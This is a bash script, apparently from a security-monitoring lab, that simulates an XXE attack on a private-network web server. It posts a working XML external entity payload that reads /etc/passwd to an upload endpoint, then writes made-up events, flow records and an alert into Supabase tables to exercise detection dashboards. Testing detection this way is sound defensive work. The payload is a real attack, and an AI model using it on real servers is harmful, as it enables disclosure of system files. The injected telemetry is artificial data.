#!/bin/bash
# attack-sim-07-web-xxe-injection.sh

source "$HOME/.supabase-env"

ATTACKER_IP="192.168.64.9"   
TARGET_WEB="192.168.64.7"    
TARGET_PORT=80
BASE_URL="http://$TARGET_WEB"

echo "[*] XXE injection simulation vers $TARGET_WEB..."

XXE_PAYLOAD='<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>'

# 1) Vraie requÃªte HTTP (logs Apache -> Wazuh)
curl -s -X POST "$BASE_URL/upload_xml.php" \
  -H "Content-Type: application/xml" \
  --data "$XXE_PAYLOAD" >/dev/null 2>&1 || true

# 2) Events XXE dans 'events' (Supabase)
curl -s -X POST "$SUPABASE_URL/rest/v1/events" \
  -H "apikey: $SUPABASE_SERVICE_KEY" \
  -H "Authorization: Bearer $SUPABASE_SERVICE_KEY" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=minimal" \
  -d "{
    \"source_ip\":\"$ATTACKER_IP\",
    \"dest_ip\":\"$TARGET_WEB\",
    \"event_type\":\"xxe_attempt\",
    \"severity\":\"high\",
    \"description\":\"XXE payload uploaded to XML endpoint\",
    \"mitre_technique\":\"T1190\"
  }" >/dev/null

curl -s -X POST "$SUPABASE_URL/rest/v1/events" \
  -H "apikey: $SUPABASE_SERVICE_KEY" \
  -H "Authorization: Bearer $SUPABASE_SERVICE_KEY" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=minimal" \
  -d "{
    \"source_ip\":\"$ATTACKER_IP\",
    \"dest_ip\":\"$TARGET_WEB\",
    \"event_type\":\"xxe_entity_expand\",
    \"severity\":\"high\",
    \"description\":\"XML external entity expansion detected\",
    \"mitre_technique\":\"T1190\"
  }" >/dev/null

curl -s -X POST "$SUPABASE_URL/rest/v1/events" \
  -H "apikey: $SUPABASE_SERVICE_KEY" \
  -H "Authorization: Bearer $SUPABASE_SERVICE_KEY" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=minimal" \
  -d "{
    \"source_ip\":\"$ATTACKER_IP\",
    \"dest_ip\":\"$TARGET_WEB\",
    \"event_type\":\"file_read\",
    \"severity\":\"critical\",
    \"description\":\"/etc/passwd accessed via XXE\",
    \"mitre_technique\":\"T1005\"
  }" >/dev/null

# 3) Flow HTTP suspect dans 'network_flows' (Zeek-like, /network)
BYTES=$((RANDOM % 700000 + 200000))
PACKETS=$((RANDOM % 2500 + 400))
DURATION=$((RANDOM % 30000 + 5000))
SCORE=$((RANDOM % 20 + 75))

curl -s -X POST "$SUPABASE_URL/rest/v1/network_flows" \
  -H "apikey: $SUPABASE_SERVICE_KEY" \
  -H "Authorization: Bearer $SUPABASE_SERVICE_KEY" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=minimal" \
  -d "{
    \"src_ip\": \"$ATTACKER_IP\",
    \"dst_ip\": \"$TARGET_WEB\",
    \"src_port\": 54324,
    \"dst_port\": $TARGET_PORT,
    \"protocol\": \"tcp\",
    \"bytes_sent\": $BYTES,
    \"packets_sent\": $PACKETS,
    \"duration_ms\": $DURATION,
    \"service\": \"http\",
    \"is_anomalous\": true,
    \"threat_score\": $SCORE
  }" >/dev/null

# 4) Alerte pour le daily report ('alerts')
curl -s -X POST "$SUPABASE_URL/rest/v1/alerts" \
  -H "apikey: $SUPABASE_SERVICE_KEY" \
  -H "Authorization: Bearer $SUPABASE_SERVICE_KEY" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=minimal" \
  -d "{
    \"title\": \"Web XXE injection & local file read detected\",
    \"description\": \"XXE payload upload, entity expansion et lecture de fichier sensible sur $TARGET_WEB\",
    \"severity\": \"critical\",
    \"status\": \"open\",
    \"mitre_technique\": \"T1190,T1005\"
  }" >/dev/null

echo "[+] XXE injection attack simulated"
